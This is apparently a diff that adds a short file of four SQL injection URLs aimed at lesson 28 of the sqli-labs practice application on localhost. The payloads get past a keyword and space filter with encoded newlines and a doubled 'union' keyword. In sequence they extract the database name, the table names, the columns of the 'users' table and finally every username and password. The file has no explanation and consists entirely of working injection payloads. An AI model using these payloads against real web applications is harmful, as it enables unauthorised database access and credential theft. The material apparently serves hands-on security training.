@@ -1,0 +1,10 @@
+http://localhost/sqli-labs-php7-master/Less-28/?id=0%27)%0AunioUnion%0Aselectn%0Aselect%0A1,database(),(%271
+
+
+http://localhost/sqli-labs-php7-master/Less-28/?id=0%27)%0AunioUnion%0Aselectn%0Aselect%0A1,group_concat(table_name),3%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database()%26%26(%271%27)=(%271
+
+
+http://localhost/sqli-labs-php7-master/Less-28/?id=0%27)%0AunioUnion%0Aselectn%0Aselect%0A1,group_concat(column_name),3%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name=%27users%27%26%26(%271%27)=(%271
+
+
+http://localhost/sqli-labs-php7-master/Less-28/?id=0%27)%0AunioUnion%0Aselectn%0Aselect%0A1,group_concat(username),group_concat(password)%0Afrom%0Ausers%0ahaving%0a(%271%27)=(%271
